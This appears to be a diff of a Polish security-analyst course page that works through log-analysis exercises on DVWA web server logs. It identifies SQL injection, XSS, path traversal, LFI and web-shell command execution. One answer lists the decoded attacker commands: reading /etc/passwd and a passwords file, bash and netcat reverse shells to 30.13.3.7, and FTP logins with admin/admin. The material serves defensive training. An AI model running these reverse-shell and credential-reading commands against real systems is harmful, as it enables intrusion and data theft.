@@ -44,10 +44,15 @@ W tym celu użejemy komendy **cat 1access.log | cut -d' ' -f8 | sort | uniq -c |
 ![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/7-image.png)
 
 **Odp:**
+
 	6344 /vulnerabilities/sqli/index.php
+	
      10 /vulnerabilities/sqli/?id=1&Submit=Submit
+	 
       5 /vulnerabilities/sqli/?id=1%27%20ORDER%20BY%201%23&Submit=Submit
+	  
       4 /vulnerabilities/sqli/?id=1&Submit=Submit%27%20ORDER%20BY%201%23
+	  
       4 /login.php
 
 6. **Przeanalizuj zalogowane parametry useragent. Zidentyfikuj użyte przez atakującego narzędzia.** 
@@ -84,12 +89,15 @@ Grepujemy User-Agentów, które zawierają informacje o przeglądarce. Robię to
 ![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/12-image.png)
 
 Widać tutaj **dwa momenty**:
+
 dvwa.com:80 30.13.3.7 - - [24/May/2022:04:13:57 +0200] "POST /login.php htxp/1.1" 302 337 "htxp://dvwa[.]com/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+
 dvwa.com:80 30.13.3.7 - - [24/May/2022:04:13:57 +0200] "GET /index.php htxp/1.1" 200 2894 "htxp://dvwa[.]com/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
 
 Oraz 
 
 dvwa.com:80 30.13.3.7 - - [24/May/2022:05:01:49 +0200] "POST /login.php htxp/1.1" 302 337 "htxp://dvwa[].com/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+
 dvwa.com:80 30.13.3.7 - - [24/May/2022:05:01:49 +0200] "GET /index.php htxp/1.1" 200 2894 "htxp://dvwa[.]com/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
 
 W przefiltrowanym ruchu widzimy dwa żądania **POST /login.php,** po których pojawia się przekierowanie `302`i wejście na `index.php`, co zwykle oznacza udane zalogowanie.
@@ -109,7 +117,9 @@ https://jakwybrachosting.pl/przekierowanie-302/
 ![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/14-image.png)
 
 **Odp. 
+
 od 24/May/2022:06:24:31 +0200 UTC 
+
 do 24/May/2022:06:31:10 +0200 UTC**
 
 3. **W jakim for(ma)cie jest plik logów oraz, którego pliku jest kopią?** 
@@ -147,6 +157,7 @@ Wygląda to na manualny atak - na screenie widać zwykły browser flow czyli:
 7. **Jaką technikę ataku na aplikację webową wykorzystano?** 
 
 **grep -Eio 'script|img+src' 2access.log | sort | uniq -c | sort -nr**
+
 Szukamy "wstrzyknięcia" do strony własnego Javascriptu, bazując po słowie "script"
 
 ![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/19-image.png)
@@ -188,7 +199,7 @@ Powyższy kod wskazuje nam takie rzeczy jak
 
 ![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/23-image.png)
 
-Odp. **24/May/2022:08:11:21 +0200 do 24/May/2022:09:52:03 +0200**
+**Odp.** **24/May/2022:08:11:21 +0200 do 24/May/2022:09:52:03 +0200**
 
 3. W jakim forcie jest plik logów oraz, którego pliku jest kopią? 
 
@@ -204,7 +215,7 @@ https://www.ibm.com/docs/en/webmethods-integration/wm-integration-server/11.1.0?
 
 ![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/26-image.png)
 
-Odp. **1 adres, 30.13.3.7**
+**Odp.** **1 adres, 30.13.3.7**
 
 5. Przeanalizuj zalogowane parametry useragent. Zidentyfikuj użyte przez atakującego narzędzia.
 
@@ -222,15 +233,15 @@ Odp. **nie da się dokłądnie określiść - nazwa narzędzia została prawdopo
 
 7. Przeanalizuj ruch dotyczący niecodziennego parametru useragent? Czy widzisz w nim coś niepokojącego? 
 
-**Odp.** **Parametry Useragent wygląda jak celowo zmyślona lub ręcznie ustawiona nazwa - z Mozilli (przeglądarki) na Majkrosoft Edze. Pojawia się przy żądaniach, które same w sobie są podejrzane (odwołania do simple-backdoor, parametry cmd=ls itp.). 
+**Odp.** Parametry Useragent wygląda jak celowo zmyślona lub ręcznie ustawiona nazwa - z Mozilli (przeglądarki) na Majkrosoft Edze. Pojawia się przy żądaniach, które same w sobie są podejrzane (odwołania do simple-backdoor, parametry cmd=ls itp.). 
 
 8. Jakie 3 techniki ataku potrafisz zidentyfikować na podstawie ruchu z poprzedniego zadania? 
 
-**cat 3access.log | grep "Majkrosoft Edze 100"
+**cat 3access.log | grep "Majkrosoft Edze 100"**
 
 ![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/22-image.png)
 
-**Odp:
+**Odp:**
 - **Remote Code Execution (wykonywanie komend)** – w logach widać parametry command line np. **ls /, whoami, cat /home/vulcan/.bash_history**. Atakujący wpisywał komendy, a serwer je wykonywał.
 - **LFI (wczytanie lokalnego pliku)** – w żądaniu **page=../../hackable/uploads/simple-backdoor.php** widać że aplikacja ładuje plik wskazany przez użytkownika. Atakujący próbował wczytać plik backdoora z serwera.
 - **Path Traversal (wyjście poza normalny folder)** – atakujący cofał się po folderach przez ../.., by wejść tam, gdzie normalnie nie powinien mieć wstępu.
@@ -247,53 +258,56 @@ Trzeba jeszcze odkodować w CyberChefie:
 ![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/29-image.png)
 
 **Odp.** 
-- cat /etc/passwd
-- cat ls /
-- ls /
-- whoami
-- ls /home
-- ls /home/vulcan
-- ls -a /home/vulcan
-- cat /home/vulcan/.bash_history
-- ls -lah /home/vulcan/Documents
-- cat /home/vulcan/Documents/passwords.txt
-- ip neigh
-- ssh admin@10.0.0.20 'ls'
-- bash -i >& /dev/tcp/30.13.3.7/1337 0>&1
-- bash -i >& /dev/tcp/30.13.3.7/80 0>&1
-- nc -e /bin/sh 30.13.3.7 1337
-- nc -e /bin/sh 30.13.3.7 80
-- bin/sh | nc 30.13.3.7 1337
-- /bin/sh | nc 30.13.3.7 80
-- /bin/sh | nc 30.13.3.7 1337
-- bin/sh | nc 30.13.3.7 4444
-- bash -i | nc 30.13.3.7 5555
-- bash -i 2>&1 | nc 30.13.3.7 5555
-- bash -i 2>&1 | nc 30.13.3.7 6666
-- /bin/sh 2>&1 | nc 30.13.3.7 6666
-- /bin/sh 2>&1 | nc 30.13.3.7 7777
-- printf "open 10.0.0.20\nuser admin admin\nls\nbye\n" | ftp -n
-- printf "open 10.0.0.20\nuser admin admin\nget flag.txt -\nbye\n" | ftp -n
+
+	- cat /etc/passwd
+	- cat ls /
+  
+	- ls /
+	- whoami
+	- ls /home
+	- ls /home/vulcan
+	- ls -a /home/vulcan
+	- cat /home/vulcan/.bash_history
+	- ls -lah /home/vulcan/Documents
+	- cat /home/vulcan/Documents/passwords.txt
+	- ip neigh
+	- ssh admin@10.0.0.20 'ls'
+	- bash -i >& /dev/tcp/30.13.3.7/1337 0>&1
+	- bash -i >& /dev/tcp/30.13.3.7/80 0>&1
+	- nc -e /bin/sh 30.13.3.7 1337
+	- nc -e /bin/sh 30.13.3.7 80
+	- bin/sh | nc 30.13.3.7 1337
+	- /bin/sh | nc 30.13.3.7 80
+	- /bin/sh | nc 30.13.3.7 1337
+	- bin/sh | nc 30.13.3.7 4444
+	- bash -i | nc 30.13.3.7 5555
+	- bash -i 2>&1 | nc 30.13.3.7 5555
+	- bash -i 2>&1 | nc 30.13.3.7 6666
+	- /bin/sh 2>&1 | nc 30.13.3.7 6666
+	- /bin/sh 2>&1 | nc 30.13.3.7 7777
+	- printf "open 10.0.0.20\nuser admin admin\nls\nbye\n" | ftp -n
+	- printf "open 10.0.0.20\nuser admin admin\nget flag.txt -\nbye\n" | ftp -n
 
 10. **Opisz słownie kroki atakującego na podstawie wykonanych komend.**
 
-**Odp:
-1. Atakujący próbował wyszukać obecnych użytkowników (etc/passwd)
-2. Wyświetlił katalog główny, Jakie są katalogi w /home
-3. Jaki jest użytkownik
-4. Sprawdził foldery, pliki, historię komend konta vulcan
-5. Sprawdził sąsiednie hosty w sieci lokalnej, żeby zobaczyć, z jakimi adresami IP system się komunikował
-6. Spróbował połączyć się po SSH z hostem `10.0.0.20` na konto `admin` i wykonać prostą komendę `ls`, czyli testował dalszy ruch boczny
-7. Spróbował otworzyć reverse shell do swojego hosta `30.13.3.7` na porcie `1337`
-8. Ponowił próbę reverse shella, ale na porcie `80`, pewnie licząc, że ten port będzie mniej blokowany
-9. Potem spróbował uzyskac reverse shell przy użyciu `netcat` i `/bin/sh` na porcie `1337`. Potem zrobił to samo, ale na porcie `80`
-10. Próba przesłania powloki `/bin/sh` do hosta atakującego przez `nc` na porcie `80`. Potem zrobił to samo, ale na porcie `1337`
-11. Potem kolejna próba reverse shella, tym razem na porcie `4444`
-12. Próba wysłania interaktywnej powłoki `bash` do atakującego na porcie `5555`
-13. Kolejna próba reverse shella, już z przekierowaniem błędów i wyjścia, żeby działało pełniej. Potem zrobił to samo, ale na porcie `6666`.
-14. Analogiczna próba z `/bin/sh` zamiast `bash`, na porcie `6666`
-15. Atakujący spróbował zalogować się przez FTP do hosta `10.0.0.20` danmi `admin/admin` i wyświetlić zawartość katalogu
-16. Następnie przez FTP próbował pobrać plik `flag.txt` z tego samego hosta
+Odp:
+
+	1. Atakujący próbował wyszukać obecnych użytkowników (etc/passwd)
+	2. Wyświetlił katalog główny, Jakie są katalogi w /home
+	3. Jaki jest użytkownik
+	4. Sprawdził foldery, pliki, historię komend konta vulcan
+	5. Sprawdził sąsiednie hosty w sieci lokalnej, żeby zobaczyć, z jakimi adresami IP system się komunikował
+	6. Spróbował połączyć się po SSH z hostem `10.0.0.20` na konto `admin` i wykonać prostą komendę `ls`, czyli testował dalszy ruch boczny
+	7. Spróbował otworzyć reverse shell do swojego hosta `30.13.3.7` na porcie `1337`
+	8. Ponowił próbę reverse shella, ale na porcie `80`, pewnie licząc, że ten port będzie mniej blokowany
+	9. Potem spróbował uzyskac reverse shell przy użyciu `netcat` i `/bin/sh` na porcie `1337`. Potem zrobił to samo, ale na porcie `80`
+	10. Próba przesłania powloki `/bin/sh` do hosta atakującego przez `nc` na porcie `80`. Potem zrobił to samo, ale na porcie `1337`
+	11. Potem kolejna próba reverse shella, tym razem na porcie `4444`
+	12. Próba wysłania interaktywnej powłoki `bash` do atakującego na porcie `5555`
+	13. Kolejna próba reverse shella, już z przekierowaniem błędów i wyjścia, żeby działało pełniej. Potem zrobił to samo, ale na porcie `6666`.
+	14. Analogiczna próba z `/bin/sh` zamiast `bash`, na porcie `6666`
+	15. Atakujący spróbował zalogować się przez FTP do hosta `10.0.0.20` danmi `admin/admin` i wyświetlić zawartość katalogu
+	16. Następnie przez FTP próbował pobrać plik `flag.txt` z tego samego hosta
 
 Atakujący najpierw chciał rozponać system a potem szukał danych i haseł.
 
